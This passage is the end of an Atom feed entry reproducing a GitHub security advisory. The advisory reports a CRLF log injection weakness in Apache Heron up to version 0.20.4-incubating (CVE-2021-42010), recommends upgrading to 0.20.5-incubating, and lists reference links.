        <link href="https://github.com/advisories/GHSA-95w5-q9vp-5vrm"/>
        <updated>2023-08-17T05:02:40.000Z</updated>
        <content type="html"><![CDATA[<p>Heron versions &lt;= 0.20.4-incubating allows CRLF log injection because of the lack of escaping in the log statements. Please update to version 0.20.5-incubating which addresses this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-42010">https://nvd.nist.gov/vuln/detail/CVE-2021-42010</a></li>
<li><a href="https://lists.apache.org/thread/j65nwr8n7jchngwqptzh100drcr4ry2q">https://lists.apache.org/thread/j65nwr8n7jchngwqptzh100drcr4ry2q</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2022/10/23/2">http://www.openwall.com/lists/oss-security/2022/10/23/2</a></li>
<li><a href="https://github.com/advisories/GHSA-95w5-q9vp-5vrm">https://github.com/advisories/GHSA-95w5-q9vp-5vrm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-95w5-q9vp-5vrm</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-10-24T19:00:16.000Z</published>
    </entry>
</feed>